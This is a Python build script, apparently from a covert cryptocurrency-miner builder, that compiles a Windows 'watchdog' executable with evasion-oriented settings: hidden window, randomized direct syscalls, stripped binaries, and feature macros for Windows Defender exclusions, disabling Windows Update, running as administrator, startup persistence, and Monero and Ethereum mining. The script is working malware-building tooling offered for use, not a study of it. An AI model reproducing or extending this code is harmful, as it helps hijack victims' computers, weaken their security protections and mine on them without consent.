import os
import platform
import shutil


def prepare_watchdog_compiler():
    if os.path.exists('UFiles_Watchdog'):
        shutil.rmtree('UFiles_Watchdog')
    os.mkdir('UFiles_Watchdog')
    shutil.copytree('Includes', 'UFiles_Watchdog/Includes')
    shutil.copy('watchdog.cpp', 'UFiles_Watchdog/main.cpp')


def compile_watchdog(cipher_key, miner_id, watchdog_id, eth_miner_id, xmr_miner_id):
    compile_cmd = ('x86_64-w64-mingw32-g++ -m64 -Wl,-subsystem,windows -DRANDSYSCALL '
                   '-x c++ UFiles_Watchdog/main.cpp UFiles_Watchdog/Includes/*.cpp UFiles_Watchdog/Includes/Syscalls/*.c '
                   '-x assembler UFiles_Watchdog/Includes/Syscalls/syscallsstubs.rnd.x64.s '
                   f'-LLibs/ {"-llibpeconv_win" if platform.system() == "Windows" else "-llibpeconv"}  -I../libpeconv/include '
                   '-O2 -g0 -static-libgcc -static-libstdc++ '
                   '-fno-stack-protector -fno-threadsafe-statics -fvisibility=hidden -fdata-sections '
                   '-ffunction-sections -fno-exceptions '
                   '-Wl,--gc-sections -flto -pipe -Wl,--strip-all -s -o output/watchdog.exe '
                   '-D _WIN64 -D _WIN32_WINNT=0x0601 ')

    def macro_arg(name, value):
        if platform.system() == 'Windows':
            value = str(value).replace('"', '\\"')
            return f'-D {name}="{value}" '
        else:
            return f'-D {name}=\'{value}\' '

    compile_cmd += ('-D DefRunAsAdministrator '
                    '-D DefStartup '
                    '-D DefWDExclusions '
                    '-D DefDisableWindowsUpdate '
                    '-D DefDisableSleep '
                    '-D DefRunInstall '
                    '-D DefWatchdog '
                    '-D DefMineXMR '
                    '-D DefMineETH '
                    '-D DefResources ')
    compile_cmd += (
                   macro_arg('CIPHERKEY', f'"{cipher_key}"') +
                   macro_arg('LMinerETHID', f'L"{eth_miner_id}"') +
                   macro_arg('LMinerXMRID', f'L"{xmr_miner_id}"') +
                   macro_arg('LWATCHDOGID', f'L"{watchdog_id}"') +
                   macro_arg('LMUTEXMINER', f'L"\\\\BaseNamedObjects\\\\{miner_id}"'))
    os.system(compile_cmd)
